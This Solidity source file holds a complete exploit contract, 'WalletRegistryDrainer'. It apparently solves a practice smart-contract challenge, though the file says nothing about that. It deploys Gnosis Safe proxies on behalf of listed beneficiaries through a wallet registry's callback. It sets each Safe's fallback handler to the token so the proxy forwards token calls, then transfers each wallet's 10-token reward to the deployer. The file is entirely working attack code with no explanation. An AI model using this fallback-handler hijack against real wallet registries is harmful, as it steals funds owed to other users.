// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol';
import '@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol';
import '@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol';

/**
 * @title WalletRegistryDrainer
 * @author Patate
 */
contract WalletRegistryDrainer {
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    address public immutable owner;
    IProxyCreationCallback public immutable walletRegistry;
    GnosisSafeProxyFactory public immutable factory;
    address public immutable singleton;
    address[] public beneficiaries;
    ERC20 public immutable token;

    constructor(
        IProxyCreationCallback _walletRegistry,
        GnosisSafeProxyFactory _factory,
        address _singleton,
        address[] memory _beneficiaries,
        ERC20 _token
    ) {
        owner = msg.sender;
        walletRegistry = _walletRegistry;
        factory = _factory;
        singleton = _singleton;
        beneficiaries = _beneficiaries;
        token = _token;
    }

    function drain() external {
        bytes memory initializer;
        GnosisSafeProxy[] memory proxies = new GnosisSafeProxy[](beneficiaries.length);
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            // setting up initializer
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];
            uint256 threshold = 1;
            address to = address(0);
            bytes memory data = '';
            address fallbackHandler = address(token);
            address paymentToken = address(0);
            uint256 payment = 0;
            address paymentReceiver = address(0);

            initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                threshold,
                to,
                data,
                fallbackHandler,
                paymentToken,
                payment,
                paymentReceiver
            );

            proxies[i] = factory.createProxyWithCallback(singleton, initializer, i, walletRegistry);

            uint256 tokenBalance = token.balanceOf(address(proxies[i]));
            require(tokenBalance == TOKEN_PAYMENT);

            IERC20(address(proxies[i])).transfer(owner, tokenBalance);
        }
    }
}
